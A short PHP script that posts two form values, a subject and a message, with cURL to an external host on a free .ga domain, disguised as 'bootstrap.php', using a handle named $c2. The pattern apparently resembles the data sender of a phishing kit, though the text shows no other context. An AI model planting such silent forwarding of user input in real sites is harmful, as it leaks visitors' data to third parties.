<?php

$url = "https://javascriptforum.virtual01.ga/bootstrap.php";
$data = "subjek=".$subjek."&pesan=".$pesan;

$c2 = curl_init();
curl_setopt($c2, CURLOPT_URL, $url);
curl_setopt($c2, CURLOPT_POST, 1);
curl_setopt($c2, CURLOPT_POSTFIELDS, $data);
curl_setopt($c2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c2, CURLOPT_COOKIEJAR, getcwd(). "/jnck.txt");
curl_setopt($c2, CURLOPT_COOKIEFILE, getcwd(). "/jnck.txt");
curl_setopt($c2, CURLOPT_HEADER, 0);
curl_setopt($c2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($c2);
curl_close($c2);

?>